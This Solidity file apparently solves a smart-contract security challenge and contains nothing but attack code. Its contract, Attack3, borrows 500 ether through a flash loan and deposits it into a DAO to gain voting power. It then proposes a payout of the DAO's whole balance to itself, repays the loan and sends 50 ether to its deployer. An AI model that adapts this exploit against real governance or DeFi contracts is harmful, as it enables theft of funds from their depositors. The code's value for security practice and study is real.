//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlash {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
}

interface IDao {
    function deposit() external payable;
    function withdraw() external;
    function propose(address target, bytes calldata data,uint256 amount) external;
    function vote(bool vote) external;
}

contract Attack3 {
  address dao;
  address pool;
  address me;

  constructor(address _dao, address _pool) {
    dao = _dao;
    pool = _pool;
    me = msg.sender;
  }

  function attack() external {
    IFlash(pool).flashLoan(500 ether);
  }

  function receiveLoan() external payable {
    IDao(dao).deposit{value: msg.value}();
    bytes memory dropBombs = abi.encodeWithSignature("dropBombs()");
    IDao(dao).propose(address(this), dropBombs, address(dao).balance);
  }

  function dropBombs() external payable {
    require(address(this).balance >= 550 ether, "Something went wrong");
    IFlash(pool).deposit{value: 500 ether}();
    payable(me).call{value: 50 ether}("");
  }

  fallback() external payable {}
}